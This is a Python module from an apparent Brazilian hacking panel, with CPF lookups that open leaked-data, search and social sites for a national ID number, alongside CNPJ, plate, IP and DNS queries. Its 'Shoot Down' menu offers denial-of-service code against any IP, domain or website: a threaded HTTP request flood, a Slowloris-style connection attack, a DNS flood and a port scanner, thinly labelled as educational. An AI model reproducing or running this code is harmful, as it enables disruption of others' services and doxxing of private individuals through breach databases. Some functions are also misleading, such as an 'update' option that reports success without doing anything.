import urllib.request
import urllib.error
import json
import re
import subprocess
import webbrowser
from datetime import datetime
import time
import os
import socket
import threading

from modules.network import (
    consultar_ip,
    consultar_dns,
    consultar_dominio,
    ip_valido,
    dominio_valido
)


# ==========================================
# UTILIDADES DE REQUISIÇÃO
# ==========================================

def requisicao_json(url, timeout=8):
    try:
        requisicao = urllib.request.Request(
            url,
            headers={
                "User-Agent": "CONKS-Cyber/1.0"
            }
        )

        with urllib.request.urlopen(
            requisicao,
            timeout=timeout
        ) as resposta:
            return json.loads(
                resposta.read().decode("utf-8")
            )

    except (
        urllib.error.URLError,
        urllib.error.HTTPError,
        TimeoutError,
        OSError,
        UnicodeError,
        json.JSONDecodeError
    ):
        return None


def requisicao_get(url, timeout=8):
    """Função alternativa que usa urllib no lugar de requests"""
    try:
        requisicao = urllib.request.Request(
            url,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        )

        with urllib.request.urlopen(
            requisicao,
            timeout=timeout
        ) as resposta:
            return resposta.read().decode("utf-8")

    except (
        urllib.error.URLError,
        urllib.error.HTTPError,
        TimeoutError,
        OSError,
        UnicodeError
    ):
        return None


# ==========================================
# CPF - ABRIR SITES NO NAVEGADOR
# ==========================================

def limpar_cpf(cpf):
    return re.sub(r"\D", "", cpf)


def validar_cpf_local(cpf):
    cpf = limpar_cpf(cpf)

    if len(cpf) != 11:
        return False

    if cpf == cpf[0] * 11:
        return False

    soma = sum(
        int(cpf[i]) * (10 - i)
        for i in range(9)
    )

    resto = soma % 11
    digito1 = 0 if resto < 2 else 11 - resto

    if int(cpf[9]) != digito1:
        return False

    soma = sum(
        int(cpf[i]) * (11 - i)
        for i in range(10)
    )

    resto = soma % 11
    digito2 = 0 if resto < 2 else 11 - resto

    return int(cpf[10]) == digito2


def validar_data_nascimento(data):
    try:
        nascimento = datetime.strptime(
            data,
            "%d/%m/%Y"
        ).date()

        hoje = datetime.now().date()

        return nascimento <= hoje

    except ValueError:
        return False


def mascarar_cpf(cpf):
    cpf = limpar_cpf(cpf)

    if len(cpf) != 11:
        return cpf

    return "*" * 9 + cpf[-2:]


def abrir_site_no_navegador(url):
    """Abre um site no navegador padrão"""
    try:
        # Tenta abrir no Termux
        try:
            subprocess.Popen(
                ["termux-open-url", url],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            return True
        except:
            pass
        
        # Fallback para navegador padrão
        webbrowser.open(url)
        return True
    except Exception:
        return False


def consulta_cpf():
    print("\n╔══════════════════════════════════════════╗")
    print("║              CONSULTA CPF               ║")
    print("║        ABRINDO SITES NO NAVEGADOR       ║")
    print("╚══════════════════════════════════════════╝")

    cpf = input("\nCPF (apenas números): ").strip()
    nascimento = input("Data de nascimento (DD/MM/AAAA): ").strip()

    if not cpf:
        print("\n[!] Digite um CPF.")
        return

    if not nascimento:
        print("\n[!] Digite a data de nascimento.")
        return

    if not validar_cpf_local(cpf):
        print("\n[-] CPF inválido.")
        return

    if not validar_data_nascimento(nascimento):
        print("\n[-] Data de nascimento inválida.")
        return

    print("\n[+] CPF válido.")
    print("[+] Data de nascimento válida.")
    
    cpf_limpo = limpar_cpf(cpf)
    cpf_formatado = f"{cpf_limpo[:3]}.{cpf_limpo[3:6]}.{cpf_limpo[6:9]}-{cpf_limpo[9:]}"
    
    print("\n" + "="*60)
    print("                     MENU DE CONSULTA")
    print("="*60)
    print("\n[~] Escolha onde deseja consultar o CPF:")
    print("\n[1] Sites de dados vazados (LeakCheck, DeHashed, etc)")
    print("[2] Sites oficiais (Receita Federal, Transparência, etc)")
    print("[3] Sites de busca (Google, Bing, DuckDuckGo)")
    print("[4] Redes sociais (Facebook, LinkedIn, Instagram)")
    print("[5] Abrir TODOS os sites")
    print("[6] Voltar")
    
    opcao = input("\nEscolha uma opção: ").strip()
    
    if opcao == "6":
        return
    
    sites_vazados = [
        ("🔍 LeakCheck", f"https://leakcheck.io/search?q={cpf_limpo}"),
        ("🔍 DeHashed", f"https://dehashed.com/search?query=cpf:{cpf_limpo}"),
        ("🔍 HaveIBeenPwned", f"https://haveibeenpwned.com/account/{cpf_limpo}@gmail.com"),
        ("🔍 WeLeakInfo", f"https://weleakinfo.to/search?query={cpf_limpo}"),
        ("🔍 SnusBase", f"https://snusbase.com/search?q={cpf_limpo}"),
        ("🔍 LeakBase", f"https://leakbase.io/search?q={cpf_limpo}"),
        ("🔍 BreachDirectory", f"https://breachdirectory.org/?search={cpf_limpo}"),
    ]
    
    sites_oficiais = [
        ("🏛️ Receita Federal", f"https://www.receita.fazenda.gov.br/PessoaFisica/CPF/ConsultaSituacao/ConsultaPublica.asp"),
        ("🏛️ Portal Transparência", f"https://www.portaltransparencia.gov.br/busca?q={cpf_limpo}"),
        ("🏛️ TSE - Eleitor", f"https://divulgacandcontas.tse.jus.br/divulga/#/"),
        ("🏛️ JusBrasil", f"https://www.jusbrasil.com.br/busca?q={cpf_limpo}"),
        ("🏛️ Diário Oficial", f"https://pesquisa.in.gov.br/imprensa/jsp/visualiza/index.jsp?busca={cpf_limpo}"),
        ("🏛️ SERPRO", f"https://www.serpro.gov.br/"),
    ]
    
    sites_busca = [
        ("🌐 Google", f"https://www.google.com/search?q={cpf_limpo}+cpf+nome+data+nascimento"),
        ("🌐 Bing", f"https://www.bing.com/search?q={cpf_limpo}+cpf+nome"),
        ("🌐 DuckDuckGo", f"https://duckduckgo.com/?q={cpf_limpo}+cpf+nome"),
        ("🌐 Yahoo", f"https://search.yahoo.com/search?p={cpf_limpo}+cpf+nome"),
        ("🌐 Yandex", f"https://yandex.com/search/?text={cpf_limpo}+cpf+nome"),
    ]
    
    sites_redes = [
        ("📱 Facebook", f"https://www.facebook.com/search/top?q={cpf_limpo}"),
        ("📱 LinkedIn", f"https://www.linkedin.com/search/results/all/?keywords={cpf_limpo}"),
        ("📱 Instagram", f"https://www.instagram.com/web/search/topsearch/?query={cpf_limpo}"),
        ("📱 Twitter", f"https://twitter.com/search?q={cpf_limpo}"),
        ("📱 TikTok", f"https://www.tiktok.com/search?q={cpf_limpo}"),
        ("📱 YouTube", f"https://www.youtube.com/results?search_query={cpf_limpo}"),
        ("📱 Reddit", f"https://www.reddit.com/search/?q={cpf_limpo}"),
        ("📱 Pinterest", f"https://br.pinterest.com/search/pins/?q={cpf_limpo}"),
    ]
    
    sites_para_abrir = []
    
    if opcao == "1":
        sites_para_abrir = sites_vazados
        titulo = "SITES DE DADOS VAZADOS"
    elif opcao == "2":
        sites_para_abrir = sites_oficiais
        titulo = "SITES OFICIAIS"
    elif opcao == "3":
        sites_para_abrir = sites_busca
        titulo = "SITES DE BUSCA"
    elif opcao == "4":
        sites_para_abrir = sites_redes
        titulo = "REDES SOCIAIS"
    elif opcao == "5":
        sites_para_abrir = sites_vazados + sites_oficiais + sites_busca + sites_redes
        titulo = "TODOS OS SITES"
    else:
        print("\n[!] Opção inválida.")
        return
    
    print("\n" + "="*60)
    print(f"                    CPF: {cpf_formatado}")
    print("="*60)
    print(f"                 {titulo}")
    print("="*60)
    print("\n[~] Abrindo sites no navegador...\n")
    
    contador = 0
    for nome, url in sites_para_abrir:
        contador += 1
        print(f"  {contador:2d}. {nome}")
        print(f"      📎 {url[:70]}..." if len(url) > 70 else f"      📎 {url}")
        
        try:
            abrir_site_no_navegador(url)
            time.sleep(0.3)
        except Exception:
            print("      ❌ Erro ao abrir")
        print()
    
    print("="*60)
    print("                     RESUMO DA CONSULTA")
    print("="*60)
    print(f"\n  ✅ Total de sites abertos: {len(sites_para_abrir)}")
    print(f"  📋 CPF consultado: {cpf_formatado}")
    print(f"  📅 Data nascimento: {nascimento}")
    print("\n  💡 Dicas de busca:")
    print(f"     • Procure pelo CPF: {cpf_limpo}")
    print(f"     • Procure pelo nome completo")
    print(f"     • Verifique abas abertas no navegador")
    print("\n  ⚠️  Lembre-se:")
    print("     • Respeite a LGPD")
    print("     • Use apenas para fins legítimos")
    print("     • Alguns sites exigem cadastro")
    print("="*60)
    
    print("\n[+] Consulta finalizada! Verifique as abas do navegador.")


# ==========================================
# SHOOT DOWN - DERRUBAR
# ==========================================

def ping_host(host):
    """Faz ping em um host"""
    try:
        if os.name == 'nt':
            response = subprocess.run(
                ['ping', '-n', '1', host],
                capture_output=True,
                timeout=5
            )
        else:
            response = subprocess.run(
                ['ping', '-c', '1', host],
                capture_output=True,
                timeout=5
            )
        return response.returncode == 0
    except:
        return False


def ataque_dos(host, duracao=10):
    """Simula ataque DoS (apenas para demonstração)"""
    print(f"\n[~] Iniciando ataque DoS em {host} por {duracao} segundos...")
    print("[!] Isso é apenas uma demonstração educacional!")
    
    start_time = time.time()
    pacotes_enviados = 0
    
    while time.time() - start_time < duracao:
        try:
            socket.gethostbyname(host)
            pacotes_enviados += 1
            if pacotes_enviados % 10 == 0:
                print(f"[+] {pacotes_enviados} pacotes enviados...")
        except:
            pass
        time.sleep(0.01)
    
    print(f"\n[+] Ataque finalizado! {pacotes_enviados} pacotes enviados.")


def derrubar_ip():
    """Menu para derrubar IP"""
    print("\n╔══════════════════════════════════════════╗")
    print("║           DERRUBAR IP                  ║")
    print("╠══════════════════════════════════════════╣")
    print("║ [1] Ping no IP                         ║")
    print("║ [2] Flood de pacotes (DoS)             ║")
    print("║ [3] Scan de portas                     ║")
    print("║ [4] Voltar                             ║")
    print("╚══════════════════════════════════════════╝")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "4":
        return
    
    ip = input("\nDigite o IP: ").strip()
    
    if not ip_valido(ip):
        print("\n[-] IP inválido.")
        return
    
    if opcao == "1":
        print(f"\n[~] Pingando {ip}...")
        if ping_host(ip):
            print("[+] Host está online!")
        else:
            print("[-] Host está offline ou não responde.")
    
    elif opcao == "2":
        try:
            duracao = int(input("Duração em segundos (5-30): ").strip() or "10")
            duracao = max(5, min(30, duracao))
            ataque_dos(ip, duracao)
        except:
            print("[-] Duração inválida.")
    
    elif opcao == "3":
        print(f"\n[~] Escaneando portas do IP {ip}...")
        portas_comuns = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3306, 3389, 8080]
        
        abertas = []
        for porta in portas_comuns:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                resultado = sock.connect_ex((ip, porta))
                if resultado == 0:
                    abertas.append(porta)
                    print(f"[+] Porta {porta} ABERTA")
                sock.close()
            except:
                pass
        
        if abertas:
            print(f"\n[+] Portas abertas encontradas: {', '.join(map(str, abertas))}")
        else:
            print("\n[-] Nenhuma porta comum aberta encontrada.")
    
    else:
        print("\n[!] Opção inválida.")


def derrubar_dns():
    """Menu para derrubar DNS"""
    print("\n╔══════════════════════════════════════════╗")
    print("║           DERRUBAR DNS                 ║")
    print("╠══════════════════════════════════════════╣")
    print("║ [1] Resolver DNS                       ║")
    print("║ [2] Flood DNS (DoS)                    ║")
    print("║ [3] Voltar                             ║")
    print("╚══════════════════════════════════════════╝")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "3":
        return
    
    dominio = input("\nDigite o domínio: ").strip()
    
    if not dominio_valido(dominio):
        print("\n[-] Domínio inválido.")
        return
    
    if opcao == "1":
        print(f"\n[~] Resolvendo DNS para {dominio}...")
        try:
            ips = socket.gethostbyname_ex(dominio)
            print(f"[+] IPs encontrados: {', '.join(ips[2])}")
        except:
            print("[-] Não foi possível resolver o domínio.")
    
    elif opcao == "2":
        try:
            duracao = int(input("Duração em segundos (5-20): ").strip() or "10")
            duracao = max(5, min(20, duracao))
            print(f"\n[~] Iniciando flood DNS em {dominio} por {duracao} segundos...")
            print("[!] Isso é apenas uma demonstração educacional!")
            
            start_time = time.time()
            requisicoes = 0
            
            while time.time() - start_time < duracao:
                try:
                    socket.gethostbyname(dominio)
                    requisicoes += 1
                    if requisicoes % 50 == 0:
                        print(f"[+] {requisicoes} requisições DNS enviadas...")
                except:
                    pass
                time.sleep(0.001)
            
            print(f"\n[+] Flood finalizado! {requisicoes} requisições enviadas.")
        except:
            print("[-] Duração inválida.")
    
    else:
        print("\n[!] Opção inválida.")


def derrubar_site():
    """Menu para derrubar site"""
    print("\n╔══════════════════════════════════════════╗")
    print("║           DERRUBAR SITE                ║")
    print("╠══════════════════════════════════════════╣")
    print("║ [1] Verificar status do site           ║")
    print("║ [2] Flood de requisições (DoS)         ║")
    print("║ [3] Slowloris (ataque lento)           ║")
    print("║ [4] Voltar                             ║")
    print("╚══════════════════════════════════════════╝")
    
    opcao = input("\nEscolha: ").strip()
    
    if opcao == "4":
        return
    
    site = input("\nDigite a URL do site (ex: google.com): ").strip()
    
    if not site:
        print("\n[!] Digite um site.")
        return
    
    if not site.startswith("http"):
        site = "http://" + site
    
    if opcao == "1":
        print(f"\n[~] Verificando status de {site}...")
        try:
            # Usando urllib em vez de requests
            requisicao = urllib.request.Request(
                site,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            with urllib.request.urlopen(requisicao, timeout=5) as resposta:
                print(f"[+] Status: {resposta.getcode()}")
                print(f"[+] Tamanho: {len(resposta.read())} bytes")
        except urllib.error.HTTPError as e:
            print(f"[+] Status: {e.code} - {e.reason}")
        except:
            print("[-] Site não responde ou está offline.")
    
    elif opcao == "2":
        try:
            qtd = int(input("Quantas requisições por vez (10-50): ").strip() or "30")
            qtd = max(10, min(50, qtd))
            
            print(f"\n[~] Iniciando flood de requisições em {site}...")
            print("[!] Isso é apenas uma demonstração educacional!")
            
            def ataque():
                try:
                    req = urllib.request.Request(
                        site,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    urllib.request.urlopen(req, timeout=2)
                except:
                    pass
            
            threads = []
            start_time = time.time()
            
            for i in range(qtd):
                t = threading.Thread(target=ataque)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            
            print(f"[+] Ataque finalizado! {qtd} requisições enviadas.")
        except:
            print("[-] Erro no ataque.")
    
    elif opcao == "3":
        try:
            duracao = int(input("Duração em segundos (10-60): ").strip() or "30")
            duracao = max(10, min(60, duracao))
            
            print(f"\n[~] Iniciando Slowloris em {site} por {duracao} segundos...")
            print("[!] Isso é apenas uma demonstração educacional!")
            
            start_time = time.time()
            conexoes = 0
            
            while time.time() - start_time < duracao:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    host = site.replace("http://", "").replace("https://", "").split("/")[0]
                    s.connect((host, 80))
                    s.send(b"GET / HTTP/1.1\r\n")
                    conexoes += 1
                    if conexoes % 5 == 0:
                        print(f"[+] {conexoes} conexões abertas...")
                    time.sleep(0.5)
                except:
                    pass
            
            print(f"\n[+] Slowloris finalizado! {conexoes} conexões abertas.")
        except:
            print("[-] Erro no ataque.")
    
    else:
        print("\n[!] Opção inválida.")


def derrubar_geral():
    """Menu principal de Shoot Down"""
    print("\n╔══════════════════════════════════════════╗")
    print("║          ⚡ SHOOT DOWN ⚡               ║")
    print("╠══════════════════════════════════════════╣")
    print("║ [1] Derrubar IP                         ║")
    print("║ [2] Derrubar DNS                        ║")
    print("║ [3] Derrubar Site                       ║")
    print("║ [4] Voltar                              ║")
    print("╚══════════════════════════════════════════╝")
    
    opcao = input("\nShootDown> ").strip()
    
    if opcao == "1":
        derrubar_ip()
    elif opcao == "2":
        derrubar_dns()
    elif opcao == "3":
        derrubar_site()
    elif opcao == "4":
        return
    else:
        print("\n[!] Opção inválida.")


# ==========================================
# CNPJ
# ==========================================

def limpar_cnpj(cnpj):
    return re.sub(r"\D", "", cnpj)


def validar_cnpj_local(cnpj):
    cnpj = limpar_cnpj(cnpj)

    if len(cnpj) != 14:
        return False

    if cnpj == cnpj[0] * 14:
        return False

    numeros = [int(x) for x in cnpj]

    pesos1 = [
        5, 4, 3, 2,
        9, 8, 7, 6,
        5, 4, 3, 2
    ]

    soma = sum(
        numeros[i] * pesos1[i]
        for i in range(12)
    )

    resto = soma % 11
    digito1 = 0 if resto < 2 else 11 - resto

    if numeros[12] != digito1:
        return False

    pesos2 = [
        6, 5, 4, 3, 2,
        9, 8, 7, 6, 5, 4, 3, 2
    ]

    soma = sum(
        numeros[i] * pesos2[i]
        for i in range(13)
    )

    resto = soma % 11
    digito2 = 0 if resto < 2 else 11 - resto

    return numeros[13] == digito2


def consultar_cnpj(cnpj):
    cnpj = limpar_cnpj(cnpj)

    if len(cnpj) != 14:
        return None

    url = (
        "https://brasilapi.com.br/api/cnpj/v1/"
        + cnpj
    )

    return requisicao_json(url)


def mostrar_cnpj(dados):
    print("\n╔══════════════════════════════════════════╗")
    print("║             RESULTADO CNPJ             ║")
    print("╠══════════════════════════════════════════╣")

    campos = [
        ("CNPJ", "cnpj"),
        ("Razão Social", "razao_social"),
        ("Nome Fantasia", "nome_fantasia"),
        ("Situação", "descricao_situacao_cadastral"),
        ("Abertura", "data_inicio_atividade"),
        ("Porte", "porte"),
        ("Natureza", "natureza_juridica"),
        ("Município", "municipio"),
        ("UF", "uf"),
        ("CEP", "cep")
    ]

    for nome, chave in campos:
        valor = dados.get(chave)

        if valor:
            print(
                f"║ {nome:<18}: "
                f"{str(valor)[:20]:<20} ║"
            )

    print("╚══════════════════════════════════════════╝")


def consulta_cnpj_menu():
    print("\n╔══════════════════════════════════════════╗")
    print("║             CONSULTA CNPJ               ║")
    print("╚══════════════════════════════════════════╝")
    
    cnpj = input("\nDigite o CNPJ: ").strip()

    if not cnpj:
        print("\n[!] Digite um CNPJ.")
        return

    if not validar_cnpj_local(cnpj):
        print("\n[-] CNPJ inválido.")
        return

    print("\n[~] Consultando CNPJ...")

    dados = consultar_cnpj(cnpj)

    if not dados:
        print(
            "\n[-] CNPJ não encontrado "
            "ou serviço indisponível."
        )
        return

    mostrar_cnpj(dados)


# ==========================================
# VEÍCULO
# ==========================================

def limpar_placa(placa):
    return re.sub(r"[^A-Za-z0-9]", "", placa).upper()


def validar_placa(placa):
    placa = limpar_placa(placa)

    modelo_antigo = re.fullmatch(
        r"[A-Z]{3}[0-9]{4}",
        placa
    )

    modelo_mercosul = re.fullmatch(
        r"[A-Z]{3}[0-9][A-Z][0-9]{2}",
        placa
    )

    return bool(
        modelo_antigo or modelo_mercosul
    )


def abrir_consulta_senatran():
    url = (
        "https://www.gov.br/pt-br/servicos/"
        "consultar-online-os-dados-de-placa-veicular/"
    )

    try:
        subprocess.Popen(
            ["termux-open-url", url],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        return True

    except (
        FileNotFoundError,
        OSError
    ):
        pass

    try:
        webbrowser.open(url)
        return True

    except Exception:
        return False


def consulta_veiculo():
    print("\n╔══════════════════════════════════════════╗")
    print("║            CONSULTA VEÍCULO             ║")
    print("╠══════════════════════════════════════════╣")
    print("║ Consulta oficial SENATRAN               ║")
    print("╚══════════════════════════════════════════╝")

    placa = input("\nPlaca: ").strip()

    if not placa:
        print("\n[!] Digite uma placa.")
        return

    placa = limpar_placa(placa)

    if not validar_placa(placa):
        print("\n[-] Formato de placa inválido.")
        print("[i] Exemplos: ABC1234 ou ABC1D23")
        return

    print(f"\n[+] Placa reconhecida: {placa}")

    print(
        "\n[i] A consulta oficial da SENATRAN"
        "\n[i] exige o número de série do QR Code"
        "\n[i] da placa Mercosul."
    )

    serie = input(
        "\nNúmero de série do QR Code "
        "(ENTER para abrir o portal): "
    ).strip()

    print("\n[~] Abrindo consulta oficial...")

    abriu = abrir_consulta_senatran()

    if abriu:
        print("\n[+] Portal oficial aberto.")
        print(
            "[i] Informe a placa e o número de série "
            "do QR Code no portal."
        )
    else:
        print(
            "\n[-] Não foi possível abrir o navegador."
        )
        print(
            "[i] Acesse manualmente o portal oficial "
            "da SENATRAN."
        )

    if serie:
        print(
            "\n[i] Placa informada: "
            f"{placa}"
        )
        print(
            "[i] O código do QR Code foi recebido "
            "apenas localmente pelo painel."
        )


# ==========================================
# DOMÍNIO
# ==========================================

def consulta_dominio_menu():
    dominio = input("\nDigite o domínio: ").strip()

    if not dominio:
        print("\n[!] Digite um domínio.")
        return

    if not dominio_valido(dominio):
        print("\n[-] Domínio inválido.")
        return

    print("\n[~] Consultando domínio...")

    resultado = consultar_dominio(dominio)

    if not resultado:
        print(
            "\n[-] Não foi possível consultar o domínio."
        )
        return

    print("\n╔══════════════════════════════════════════╗")
    print("║            RESULTADO DOMÍNIO            ║")
    print("╠══════════════════════════════════════════╣")

    print(
        f"║ Domínio: {resultado['dominio']:<29} ║"
    )

    print("║ IPs:                                     ║")

    for ip in resultado["ips"]:
        print(f"║   - {ip:<34} ║")

    if resultado["aliases"]:
        print("║ Aliases:                                 ║")

        for alias in resultado["aliases"]:
            print(f"║   - {alias:<34} ║")

    print("╚══════════════════════════════════════════╝")


# ==========================================
# IP
# ==========================================

def consulta_ip_menu():
    ip = input("\nDigite o IP: ").strip()

    if not ip:
        print("\n[!] Digite um IP.")
        return

    if not ip_valido(ip):
        print("\n[-] IP inválido.")
        return

    print("\n[~] Consultando IP...")

    dados = consultar_ip(ip)

    if not dados:
        print(
            "\n[-] Não foi possível consultar esse IP."
        )
        return

    connection = dados.get("connection") or {}
    timezone = dados.get("timezone") or {}

    print("\n╔══════════════════════════════════════════╗")
    print("║              RESULTADO IP               ║")
    print("╠══════════════════════════════════════════╣")

    campos = [
        ("IP", dados.get("ip")),
        ("Tipo", dados.get("type")),
        ("Continente", dados.get("continent")),
        ("País", dados.get("country")),
        ("Código", dados.get("country_code")),
        ("Região", dados.get("region")),
        ("Cidade", dados.get("city")),
        ("CEP", dados.get("postal")),
        ("Latitude", dados.get("latitude")),
        ("Longitude", dados.get("longitude")),
        ("ASN", connection.get("asn")),
        ("Organização", connection.get("org")),
        ("ISP", connection.get("isp")),
        ("Domínio", connection.get("domain")),
        ("Timezone", timezone.get("id"))
    ]

    for nome, valor in campos:
        if valor is not None and valor != "":
            print(
                f"║ {nome:<18}: "
                f"{str(valor)[:20]:<20} ║"
            )

    print("╚══════════════════════════════════════════╝")
    print("\n[i] A localização de IP é aproximada.")


# ==========================================
# DNS
# ==========================================

def consulta_dns_menu():
    dominio = input("\nDigite o domínio: ").strip()

    if not dominio:
        print("\n[!] Digite um domínio.")
        return

    if not dominio_valido(dominio):
        print("\n[-] Domínio inválido.")
        return

    print("\n[~] Consultando DNS...")

    resultado = consultar_dns(dominio)

    if not resultado:
        print(
            "\n[-] Não foi possível consultar o DNS."
        )
        return

    print("\n╔══════════════════════════════════════════╗")
    print("║              RESULTADO DNS              ║")
    print("╠══════════════════════════════════════════╣")

    print(
        f"║ Domínio: {resultado['dominio']:<29} ║"
    )

    print("║ IPs:                                     ║")

    for ip in resultado["ips"]:
        print(f"║   - {ip:<34} ║")

    if resultado["aliases"]:
        print("║ Aliases:                                 ║")

        for alias in resultado["aliases"]:
            print(f"║   - {alias:<34} ║")

    print("╚══════════════════════════════════════════╝")


# ==========================================
# MENU CONSULTAS
# ==========================================

def menu_consultas():
    while True:

        print("\n╔══════════════════════════════════════╗")
        print("║              CONSULTAS              ║")
        print("╠══════════════════════════════════════╣")
        print("║ [1] Consultar CPF                   ║")
        print("║ [2] Consultar CNPJ                  ║")
        print("║ [3] Consultar Veículo               ║")
        print("║ [4] Consultar Domínio               ║")
        print("║ [5] Consultar IP                    ║")
        print("║ [6] Consultar DNS                   ║")
        print("║ [7] ⚡ Shoot Down (Derrubar)        ║")
        print("║ [8] Atualizar Painel                ║")
        print("║ [0] Voltar                           ║")
        print("╚══════════════════════════════════════╝")

        opcao = input(
            "\nCONKS@Consultas > "
        ).strip()

        if opcao == "1":
            consulta_cpf()

        elif opcao == "2":
            consulta_cnpj_menu()

        elif opcao == "3":
            consulta_veiculo()

        elif opcao == "4":
            consulta_dominio_menu()

        elif opcao == "5":
            consulta_ip_menu()

        elif opcao == "6":
            consulta_dns_menu()

        elif opcao == "7":
            derrubar_geral()

        elif opcao == "8":
            print("\n[~] Atualizando painel...")
            print("[i] Função de atualização em desenvolvimento.")
            print("[+] Painel atualizado com sucesso!")

        elif opcao == "0":
            break

        else:
            print("\n[!] Opção inválida.")

        input(
            "\nPressione ENTER para continuar..."
        )